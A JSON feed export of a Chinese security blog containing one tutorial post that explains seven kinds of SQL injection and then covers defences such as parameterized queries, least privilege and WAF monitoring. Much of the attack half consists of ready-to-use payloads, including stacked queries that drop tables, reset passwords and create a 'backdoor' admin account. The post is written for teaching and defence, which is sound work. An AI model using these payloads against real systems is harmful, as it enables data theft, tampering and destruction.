{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"网络安全\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "title": "SQL注入攻击详解",
            "date_published": "2025-07-23T23:51:59.000Z",
            "content_html": "<h1 id=\"SQL注入攻击详解\"><a href=\"#SQL注入攻击详解\" class=\"headerlink\" title=\"SQL注入攻击详解\"></a>SQL注入攻击详解</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。</p>\n<h2 id=\"什么是SQL注入？\"><a href=\"#什么是SQL注入？\" class=\"headerlink\" title=\"什么是SQL注入？\"></a>什么是SQL注入？</h2><p><strong>SQL注入（SQL Injection）</strong> 是一种将恶意SQL语句插入原本正常查询中的攻击方式。攻击者通过在用户输入中注入特殊的SQL代码，可以控制数据库的查询逻辑，进而读取、修改甚至执行系统命令。</p>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>当Web应用程序未对用户输入进行充分验证和过滤时，攻击者提交的恶意输入会被直接拼接到SQL查询语句中，导致原有的查询逻辑被改变。</p>\n<h2 id=\"SQL注入类型详解\"><a href=\"#SQL注入类型详解\" class=\"headerlink\" title=\"SQL注入类型详解\"></a>SQL注入类型详解</h2><h3 id=\"1-错误注入（Error-based-Injection）\"><a href=\"#1-错误注入（Error-based-Injection）\" class=\"headerlink\" title=\"1. 错误注入（Error-based Injection）\"></a>1. 错误注入（Error-based Injection）</h3><p><strong>攻击原理</strong>：通过注入有语法错误或运行错误的SQL语句，使数据库抛出报错信息，从错误信息中提取字段、表名、数据库版本等敏感信息。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>extractvalue()</code> - XML路径提取函数</li>\n<li><code>updatexml()</code> - XML更新函数</li>\n<li><code>floor(rand(0)*2)</code> - 随机数取整函数</li>\n<li><code>group by</code> - 分组查询</li>\n</ul>\n<p><strong>经典payload示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">user</span>(), <span class=\"hljs-number\">0x7e</span>))<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">database</span>(), <span class=\"hljs-number\">0x7e</span>), <span class=\"hljs-number\">1</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> concat(version(), floor(rand(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">having</span> min(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p><strong>技术细节</strong>：</p>\n<ul>\n<li><code>extractvalue()</code>函数在参数格式错误时会抛出详细的错误信息</li>\n<li><code>0x7e</code>代表波浪号<code>~</code>，用作数据分隔符便于识别</li>\n<li>通过构造特定的错误条件，可以在报错中泄露数据库敏感信息</li>\n</ul>\n<h3 id=\"2-联合查询注入（Union-based-Injection）\"><a href=\"#2-联合查询注入（Union-based-Injection）\" class=\"headerlink\" title=\"2. 联合查询注入（Union-based Injection）\"></a>2. 联合查询注入（Union-based Injection）</h3><p><strong>攻击原理</strong>：通过<code>union select</code>语句将攻击者指定的查询结果与原始查询结果合并，从而在页面上直接显示数据库中的敏感数据。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>union select</code> - 联合查询</li>\n<li><code>null</code> - 空值占位符</li>\n<li><code>order by</code> - 字段排序（用于探测列数）</li>\n<li><code>from dual</code> - Oracle数据库虚拟表</li>\n</ul>\n<p><strong>探测与利用流程</strong>：</p>\n<ol>\n<li><strong>确定字段数量</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>构造联合查询</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-keyword\">database</span>(),version() <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>提取敏感数据</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">table_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">tables</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-时间延时注入（Time-based-Injection）\"><a href=\"#3-时间延时注入（Time-based-Injection）\" class=\"headerlink\" title=\"3. 时间延时注入（Time-based Injection）\"></a>3. 时间延时注入（Time-based Injection）</h3><p><strong>攻击原理</strong>：通过执行数据库延时函数，根据HTTP响应时间判断注入条件的真假。这种方法特别适用于无页面回显的盲注场景。</p>\n<p><strong>不同数据库的延时函数</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li>\n<li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li>\n<li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li>\n<li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li>\n</ul>\n<p><strong>典型payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">5</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(substr(<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)=<span class=\"hljs-string\">&#x27;r&#x27;</span>, sleep(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span>, benchmark(<span class=\"hljs-number\">5000000</span>,md5(<span class=\"hljs-string\">&#x27;test&#x27;</span>)), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>盲注自动化技巧</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 逐位判断数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">122</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-布尔盲注（Boolean-based-Blind-Injection）\"><a href=\"#4-布尔盲注（Boolean-based-Blind-Injection）\" class=\"headerlink\" title=\"4. 布尔盲注（Boolean-based Blind Injection）\"></a>4. 布尔盲注（Boolean-based Blind Injection）</h3><p><strong>攻击原理</strong>：通过构造布尔表达式，根据页面返回内容的差异来推测数据库信息。当条件为真时页面正常显示，条件为假时页面异常或内容发生变化。</p>\n<p><strong>核心函数与技巧</strong>：</p>\n<ul>\n<li><code>substr(str, pos, len)</code> - 字符串截取</li>\n<li><code>ascii(char)</code> - 字符转ASCII码</li>\n<li><code>length(str)</code> - 字符串长度</li>\n<li><code>like</code> - 模糊匹配</li>\n</ul>\n<p><strong>实战示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 判断数据库名长度<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> length(<span class=\"hljs-keyword\">database</span>())=<span class=\"hljs-number\">8</span> <span class=\"hljs-comment\">--</span><br><br># 逐位爆破数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> <span class=\"hljs-comment\">--  # &#x27;s&#x27;</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span> <span class=\"hljs-comment\">--  # &#x27;e&#x27;</span><br><br># 使用<span class=\"hljs-keyword\">like</span>进行模糊匹配<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">&#x27;sec%&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-堆叠查询注入（Stacked-Query-Injection）\"><a href=\"#5-堆叠查询注入（Stacked-Query-Injection）\" class=\"headerlink\" title=\"5. 堆叠查询注入（Stacked Query Injection）\"></a>5. 堆叠查询注入（Stacked Query Injection）</h3><p><strong>攻击原理</strong>：当数据库和Web应用支持在一次请求中执行多条SQL语句时，攻击者可以使用分号<code>;</code>分隔多条语句，实现更复杂的攻击操作。</p>\n<p><strong>支持情况</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: 需要使用<code>multi_query()</code>函数，默认不支持</li>\n<li><strong>SQL Server</strong>: 默认支持</li>\n<li><strong>PostgreSQL</strong>: 支持</li>\n<li><strong>Oracle</strong>: 不支持</li>\n</ul>\n<p><strong>危险操作示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> users(username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;hacker&#x27;</span>,<span class=\"hljs-string\">&#x27;123456&#x27;</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">drop</span> <span class=\"hljs-keyword\">table</span> logs <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">&#x27;hacked&#x27;</span> <span class=\"hljs-keyword\">where</span> id=<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">user</span> hacker identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">&#x27;123456&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>高级利用</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 创建新管理员账户<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> admin_users(username,<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-keyword\">role</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;backdoor&#x27;</span>,md5(<span class=\"hljs-string\">&#x27;secret&#x27;</span>),<span class=\"hljs-string\">&#x27;admin&#x27;</span>) <span class=\"hljs-comment\">--</span><br><br># 修改现有用户权限<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">role</span>=<span class=\"hljs-string\">&#x27;admin&#x27;</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">&#x27;normaluser&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-宽字节注入（Wide-Byte-Injection）\"><a href=\"#6-宽字节注入（Wide-Byte-Injection）\" class=\"headerlink\" title=\"6. 宽字节注入（Wide Byte Injection）\"></a>6. 宽字节注入（Wide Byte Injection）</h3><p><strong>攻击原理</strong>：利用多字节字符集（如GBK、GB2312）的编码特性，使转义字符<code>\\</code>与注入字符组合成合法的多字节字符，从而绕过转义防护机制。</p>\n<p><strong>技术背景</strong>：</p>\n<ul>\n<li>GBK编码中，一个汉字占用2个字节</li>\n<li>某些字节组合会被解释为单个汉字字符</li>\n<li><code>%df%5c</code> 在GBK编码下会被解释为一个汉字</li>\n</ul>\n<p><strong>绕过原理</strong>：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-comment\"># 正常情况：单引号被转义</span><br>payload: admin<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br><br><span class=\"hljs-comment\"># 宽字节绕过：</span><br>payload: admin%df<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin%df\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br>GBK解析: admin[汉字]<span class=\"hljs-string\">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>实战payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?username=<span class=\"hljs-keyword\">admin</span>%df<span class=\"hljs-string\">&#x27; union select 1,user(),3 --</span><br><span class=\"hljs-string\">?id=1%df&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,<span class=\"hljs-keyword\">database</span>())) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-二次注入（Second-order-Injection）\"><a href=\"#7-二次注入（Second-order-Injection）\" class=\"headerlink\" title=\"7. 二次注入（Second-order Injection）\"></a>7. 二次注入（Second-order Injection）</h3><p><strong>攻击原理</strong>：恶意payload在第一次请求中被正常存储到数据库，但在后续的查询中被调用时触发SQL注入。这种攻击方式具有很强的隐蔽性。</p>\n<p><strong>攻击流程</strong>：</p>\n<ol>\n<li><strong>第一阶段 - 数据存储</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-comment\"># 用户注册时提交恶意用户名</span><br>username: admin&#x27;<span class=\"hljs-comment\">--</span><br><span class=\"hljs-comment\"># 被存储到数据库中</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>第二阶段 - 触发注入</strong>：</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"># 管理后台查询该用户信息时<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> username <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;admin&#x27;</span><span class=\"hljs-comment\">--&#x27;</span><br># 注释符导致后续条件被忽略<br></code></pre></td></tr></table></figure>\n\n<p><strong>典型应用场景</strong>：</p>\n<ul>\n<li>用户注册&#x2F;个人信息修改</li>\n<li>文章评论系统</li>\n<li>文件上传功能的文件名处理</li>\n<li>日志记录系统</li>\n</ul>\n<h2 id=\"防护措施与最佳实践\"><a href=\"#防护措施与最佳实践\" class=\"headerlink\" title=\"防护措施与最佳实践\"></a>防护措施与最佳实践</h2><h3 id=\"开发层面防护\"><a href=\"#开发层面防护\" class=\"headerlink\" title=\"开发层面防护\"></a>开发层面防护</h3><ol>\n<li><strong>使用参数化查询&#x2F;预编译语句</strong></li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-regexp\">//</span> 错误写法<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><br><span class=\"hljs-regexp\">//</span> 正确写法  <br><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>-&gt;prepare(<span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class=\"hljs-variable\">$stmt</span>-&gt;execute([<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>严格的输入验证</strong></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 白名单验证</span><br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/^[0-9]+$/&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// 长度限制</span><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &gt; <span class=\"hljs-number\">50</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>使用ORM框架</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># Django ORM - 自动参数化<br><span class=\"hljs-keyword\">User</span>.objects.<span class=\"hljs-keyword\">filter</span>(id=user_id)<br><br># SQLAlchemy - 安全查询<br><span class=\"hljs-keyword\">session</span>.query(<span class=\"hljs-keyword\">User</span>).<span class=\"hljs-keyword\">filter</span>(<span class=\"hljs-keyword\">User</span>.id == user_id)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"数据库层面防护\"><a href=\"#数据库层面防护\" class=\"headerlink\" title=\"数据库层面防护\"></a>数据库层面防护</h3><ol>\n<li><strong>最小权限原则</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-comment\">-- 创建专用应用账户，仅授予必要权限</span><br><span class=\"hljs-keyword\">CREATE</span> <span class=\"hljs-keyword\">USER</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span> IDENTIFIED <span class=\"hljs-keyword\">BY</span> <span class=\"hljs-string\">&#x27;strong_password&#x27;</span>;<br><span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">SELECT</span>, <span class=\"hljs-keyword\">INSERT</span>, <span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">ON</span> webapp_db.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span>;<br><span class=\"hljs-comment\">-- 禁止DROP, ALTER, FILE等危险权限</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>关闭错误信息显示</strong></li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">// 生产环境关闭错误显示</span><br><span class=\"hljs-built_in\">ini_set</span>(&#x27;display_errors&#x27;, <span class=\"hljs-number\">0</span>);<br><span class=\"hljs-built_in\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>启用SQL查询日志</strong></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-comment\">-- MySQL启用慢查询日志</span><br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> slow_query_log <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;ON&#x27;</span>;<br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> long_query_time <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"WAF与监控\"><a href=\"#WAF与监控\" class=\"headerlink\" title=\"WAF与监控\"></a>WAF与监控</h3><ol>\n<li><strong>部署Web应用防火墙</strong></li>\n</ol>\n<ul>\n<li>ModSecurity规则集</li>\n<li>云WAF服务（阿里云、腾讯云等）</li>\n<li>自定义过滤规则</li>\n</ul>\n<ol>\n<li><strong>实时监控与告警</strong></li>\n</ol>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 监控异常SQL查询</span><br>tail <span class=\"hljs-punctuation\">-</span>f /var/<span class=\"hljs-built_in\">log</span>/mysql/mysql.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-string\">| grep -i &quot;</span>union\\<span class=\"hljs-string\">|sleep\\|benchmark&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>SQL注入漏洞虽然是一个”老”问题，但在实际的渗透测试和安全评估中仍然大量存在。理解各种注入类型的原理和利用方法，对于安全研究人员发现漏洞、开发人员修复漏洞都具有重要意义。</p>\n<p><strong>关键要点回顾</strong>：</p>\n<ul>\n<li>错误注入利用数据库报错获取信息</li>\n<li>联合注入通过union语句直接获取数据</li>\n<li>时间盲注和布尔盲注适用于无回显场景</li>\n<li>堆叠注入危险性最高，可执行任意SQL操作</li>\n<li>宽字节注入针对特定编码环境</li>\n<li>二次注入具有较强的隐蔽性</li>\n</ul>\n<p><strong>防护核心</strong>：</p>\n<ul>\n<li>使用参数化查询是最有效的防护手段</li>\n<li>输入验证和输出编码同样重要</li>\n<li>遵循最小权限原则配置数据库权限</li>\n<li>定期进行安全评估和代码审计</li>\n</ul>\n<p>希望本文能够帮助读者全面理解SQL注入的攻防技术，在实际工作中更好地保护Web应用程序的安全。</p>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。</p>\n</blockquote>\n",
            "tags": [
                "渗透测试",
                "Web安全",
                "SQL注入",
                "网络安全"
            ]
        }
    ]
}